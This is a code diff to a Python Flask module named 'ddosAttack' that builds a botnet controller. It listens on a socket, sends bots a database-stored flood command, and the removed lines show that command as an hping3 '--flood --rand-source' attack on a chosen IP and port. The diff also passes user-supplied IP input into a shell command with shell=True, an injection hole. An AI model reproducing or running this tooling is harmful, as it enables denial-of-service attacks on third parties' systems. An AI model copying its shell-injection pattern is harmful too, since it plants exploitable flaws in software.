@@ -4,6 +4,9 @@ import subprocess
 import time
 import socket
 import threading
+from app import db
+import sys
+import os
 
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
 
@@ -14,17 +17,21 @@ def DDOSAttack():
     portNumber = data["portNumber"]
     packetSize = data["packetSize"]
     attackType = data["attackType"]
-    duration = int(data["duration"])
+    duration = data["duration"]
+
+    command = getCommand("DDOS", "PINGFLOOD")
+    command = command.format(
+        attackType = attackType,
+        packetSize = packetSize,
+        portNumber = portNumber,
+        ipAddress = ipAddress,
+        duration = duration)
 
     # launch dos on bots using a seperate thread
-    bots = threading.Thread(target=botnet, args=(ipAddress, portNumber, packetSize, attackType, duration))
-    attack = threading.Thread(target=ddos, args=(ipAddress, portNumber, packetSize, attackType, duration))
+    bots = threading.Thread(target=botnet, args=(command, duration))
     bots.start()
-    attack.start()
-
-    # wait for threads to finish
     bots.join()
-    attack.join()
+
     return ""
 
 @ddosAttack.post("/latency")
@@ -32,7 +39,10 @@ def checkLatency():
     data = request.get_json()
     ipAddress = data["ipAddress"]
 
-    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
+    command = getCommand("PING", "LATENCY")
+    command = command.format(ipAddress = ipAddress)
+
+    pingCommand = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
     output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish
 
     lines = output.splitlines()
@@ -43,40 +53,19 @@ def checkLatency():
     else:
         return '[PING FAILED] ' + line
     
-def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration):
-    command = "sudo hping3 {attackType} -d {packetSize} --flood --rand-source -p {portNumber} {ipAddress}"
-    commandParam = command.format(
-        attackType=attackType,
-        packetSize=packetSize,
-        portNumber=portNumber,
-        ipAddress=ipAddress)
+def send_commands(conn, command):
+    # finalCommand = f"{command} --duration {duration}"
 
-    finalCommand = f"{commandParam} --duration {duration}"
-
-    if len(str.encode(finalCommand)) > 0:
-        conn.send(str.encode(finalCommand))
+    if len(str.encode(command)) > 0:
+        conn.send(str.encode(command))
         client_response = str(conn.recv(1024), "utf-8")
         print(client_response, end="")
 
-def ddos(ipAddress, portNumber, packetSize, attackType, duration):
-    dosCommand = subprocess.Popen(
-        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
-        stdout=subprocess.PIPE,
-        text=True)
-    time.sleep(duration) # carry out attack for specified duration
-
-    try:
-        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
-    except subprocess.TimeoutExpired:
-        print('Timeout occured')
-
-    dosCommand.kill()
-
-
-def botnet(ipAddress, portNumber, packetSize, attackType, duration):
+def botnet(command, duration):
     bindIp = getIpAddress()
     bindPort = 1046
     servAdd = (bindIp, bindPort)
+    duration = int(duration)
     
     # create socket to listen
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -96,7 +85,7 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
             conn, addr = server.accept() # accept the connection
             
             # Create a new thread to handle the connection
-            client_thread = threading.Thread(target=handleClient, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
+            client_thread = threading.Thread(target=handleClient, args=(conn, addr, command))
             client_thread.start()
             
             threads.append(client_thread) # Store the thread in the list
@@ -107,11 +96,11 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
     for thread in threads:
         thread.join()
 
-
-def handleClient(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
+def handleClient(conn, addr, command):
     # Handle the connection
     print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
-    send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
+    sys.stdout.flush()  # Add this line
+    send_commands(conn, command)
     conn.close()
 
 def getIpAddress():
@@ -120,3 +109,12 @@ def getIpAddress():
     ip = s.getsockname()[0]
     s.close()
     return ip
+
+def getCommand(operation, type):
+    collection = db["commands"]
+    x = collection.find_one({
+        "operation" : operation,
+        "type": type,
+        })
+
+    return x["command"]
